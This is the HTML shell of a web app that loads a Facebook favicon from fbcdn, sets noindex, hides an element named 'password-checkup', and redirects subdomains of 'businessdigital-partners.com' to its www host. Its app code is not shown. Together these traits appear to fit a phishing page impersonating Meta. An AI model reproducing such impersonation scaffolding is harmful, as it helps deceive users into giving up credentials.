<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v4/yg/r/Hn19bEHYJbt.png">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <meta name="robots" content="noindex, nofollow">
  <link
    href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
    rel="stylesheet">

  <style>
    * {
      font-family: "Nunito Sans", sans-serif;
    }

    #password-checkup {
      display: none !important;
    }
  </style>
</head>

<body>
  <div id="root"></div>
  <script>
    const currentHost = window.location.hostname;
    const targetDomain = "businessdigital-partners.com";
    const redirectTo = `www.${targetDomain}`;


    if (currentHost.endsWith(`.${targetDomain}`) && currentHost !== redirectTo) {
      const newUrl = `${window.location.protocol}//${redirectTo}${window.location.pathname}${window.location.search}`;
      window.location.replace(newUrl);
    }
  </script>
  <script type="module" src="/src/main.tsx"></script>
</body>

</html>
